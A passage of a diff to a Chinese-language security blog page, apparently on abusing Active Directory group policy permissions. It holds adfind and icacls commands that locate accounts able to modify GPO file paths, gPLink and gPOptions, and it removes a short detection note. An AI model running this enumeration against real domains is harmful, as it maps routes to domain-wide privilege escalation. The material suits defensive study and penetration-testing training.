+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;GPO 链接的权限（可选）&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -14176,22 +14146,17 @@ windows命令&lt;/p&gt;
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#查找对gPCFileSysPath属性WriteProperty权限的用户&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;adfind&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nTSecurityDescriptor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+++&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;subtree&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sdna&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddlfilter&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gPCFileSysPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-recmute&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#修改GPT的权限，由于GPT 是文件夹的形式，并不在LDAP里面，因此使用icacls查看。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#对组策略目录有修改权限的可以随意修改组策略配置&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;icacls&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sysvol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scripts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;icacls&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localsysvol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;policies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#对目录有修改权限的可以随意修改组策略配置&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;GPO链接的权限&lt;/strong&gt;
-遍历所有的域、站点、OU上的所有ACE，如果有对gPLink属性或者gPOpptions属性的修改权限，就可以修改这个这个域/站点/OU链接的OU。&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;如果有对域、OU的gPLink属性或gPOpptions属性有修改权限，就可以修改其链接的组策略。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -14204,11 +14169,7 @@ windows命令&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;adfind&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OU&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;客服部&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+++&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sdna&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddlfilter&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gPOpptions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;攻击检测&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;事件ID5136，4662，5145可以看到GPO的ACL修改。&lt;/p&gt;
-&lt;h3 id=&#34;seenabledelegationprivilege-特权&#34;&gt;SeEnableDelegationPrivilege 特权&lt;/h3&gt;
+&lt;/div&gt;&lt;h3 id=&#34;seenabledelegationprivilege-特权&#34;&gt;SeEnableDelegationPrivilege 特权&lt;/h3&gt;
 &lt;p&gt;有SeEnableDelegationPrivilege权限的域用户才能给域内服务账户设置委派（约束和非约束，但不包括基于资源的约束委派）。该权限只能通过Default Domain Controllers Policy组策略修改（或修改域控的计算机策略）。&lt;/p&gt;
 &lt;p&gt;并不是拥有一个对象的GenericAll权限，就可以修改对象的msDS-AllowedToDelegateTo属性，只能有SeEnableDelegationPrivilege权限的才行。&lt;/p&gt;
 &lt;ol&gt;
